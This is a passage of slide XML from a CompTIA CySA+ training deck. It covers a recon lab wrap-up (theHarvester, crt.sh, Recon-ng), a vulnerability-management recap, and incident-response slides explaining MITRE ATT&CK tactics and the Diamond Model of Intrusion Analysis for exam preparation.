                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Free tier (sign up required):</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3304032"/>
            <a:ext cx="10634472" cy="139293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304032"/>
            <a:ext cx="91440" cy="139293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05840" y="377190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05840" y="3771900"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3304032"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Inventory the findings</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>This is the deliverable a SOC analyst hands to the vulnerability-management team.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726180"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726180"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ mkdir -p /tmp/lab19</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4824984"/>
            <a:ext cx="10634472" cy="139293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240" y="4824984"/>
            <a:ext cx="91440" cy="139293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005840" y="5292852"/>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05840" y="5292852"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4824984"/>
            <a:ext cx="9509760" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Map the lab to CySA+ 2.5 bullet points</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624</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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19 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Use theHarvester and crt.sh for passive subdomain discovery.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Drive Recon-ng's workspace/module model and export reports.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Combine DNS, certificate transparency, and Shodan-style services into a single external inventory.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Map enumeration techniques to CySA+ attack-surface-management vocabulary.</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625</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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RECAP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Recap — Vulnerability Management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600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Asset discovery &amp; network mapping</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vulnerability scanning (OpenVAS/ZAP/Nikto)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysing scan results</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  CVSS scoring &amp; prioritisation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Web application vulnerabilities (XSS/SQLi)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Exploitation with Metasploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Patch management &amp; hardening</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Attack surface reconnaissance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626</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · 20% OF CS0-003</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Incident Response and Management</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3</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627</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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EXAM WEIGHTING 20%</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Topic 3 Overview — Incident Response and Management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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Attack frameworks (Kill Chain, ATT&amp;CK, Diamond)</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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Evidence acquisition &amp; chain of custody</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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Memory &amp; host forensics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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Log analysis for IR</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300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Containment &amp; isolation</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46904"/>
            <a:ext cx="3973068" cy="1152144"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>IR playbooks &amp; tabletop exercises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628</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Attack Frameworks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Attack frameworks provide a common, structured language for describing how adversaries operate, helping teams define the tactics, techniques, and procedures (TTPs) an attacker uses so that defenders can detect, communicate about, and respond to threats consistently. The most widely used is MITRE ATT&amp;CK (Adversarial Tactics, Techniques, and Common Knowledge), a curated knowledge base maintained by the MITRE Corporation and built from observed real-world adversary behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ATT&amp;CK organizes behavior into tactics, the attacker's objectives, which for the enterprise matrix include categories such as discovery, lateral movement, defense evasion, credential access, and collection, each populated with specific techniques that describe how the objective is achieved. Analysts map alerts and telemetry to these tactics and techniques to understand where in an intrusion they are and what may come next.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because ATT&amp;CK drives detection engineering, threat hunting, coverage gap analysis, and threat-intelligence enrichment, letting the team measure defenses against how adversaries actually behave rather than against isolated indicators.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam frequently references MITRE ATT&amp;CK as a knowledge base of adversary tactics and techniques and asks you to map observed activity such as lateral movement or defense evasion to it.</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629</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Attack Frameworks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Help define tactics, techniques, and procedures (TTPs)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  MITRE Corporation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  MITRE ATT&amp;CK (Adversarial Tactics, Techniques, and Common Knowledge)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Used to track adversarial behavior</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630</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Attack Frameworks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Activities are organized into 12 activities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Discovery</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Lateral movement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Defense evasion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Credential access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Collection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Command and control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Exfiltration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Impact</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Initial access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Execution</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631</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Attack Frameworks (3)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Activities are organized into 12 activities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Persistence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Privilege escalation</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632</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Attack Frameworks (4)</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The Diamond Model of Intrusion Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Shows relationships between 4 core components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633</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Attack Frameworks (5)</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The Diamond Model of Intrusion Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Shows relationships between 4 core components</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_d227738513.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2456268"/>
            <a:ext cx="4937760" cy="2951304"/>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634</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Attack Frameworks (6)</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The Diamond Model of Intrusion Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Shows relationships between 4 core components</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_2788bbd06d.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2468880"/>
            <a:ext cx="4937760" cy="292608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635</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Attack Frameworks (7)</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The Diamond Model of Intrusion Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Shows relationships between 4 core components</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_103019eb99.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2444643"/>
            <a:ext cx="4937760" cy="2974554"/>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636</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Diamond Model Axioms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The Diamond Model of Intrusion Analysis structures every malicious event around four core features arranged as the points of a diamond: adversary, capability, infrastructure, and victim. Its foundational axiom is that for every intrusion event there exists an adversary taking a step toward some goal by using a capability over infrastructure against a victim, so these four elements are always present and connected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The model links the points with meta-features such as timestamp, phase, result, direction, and methodology, and it emphasizes that pivoting from any one vertex can reveal the others, for example moving from an observed piece of infrastructure to the capability delivered through it or to other victims it touched. This makes analysis a process of discovering and correlating related events rather than examining indicators in isolation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because the Diamond Model organizes threat intelligence and correlates activity across intrusions, and it pairs well with kill-chain and ATT&amp;CK thinking to attribute campaigns and anticipate adversary behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions identifying the Diamond Model's four core features and its central axiom that every intrusion event links an adversary and a victim through a capability and infrastructure.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637</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Diamond Model Axioms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g_0605d5ac69.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1485410" y="1783080"/>
            <a:ext cx="9218131" cy="4434840"/>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638</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
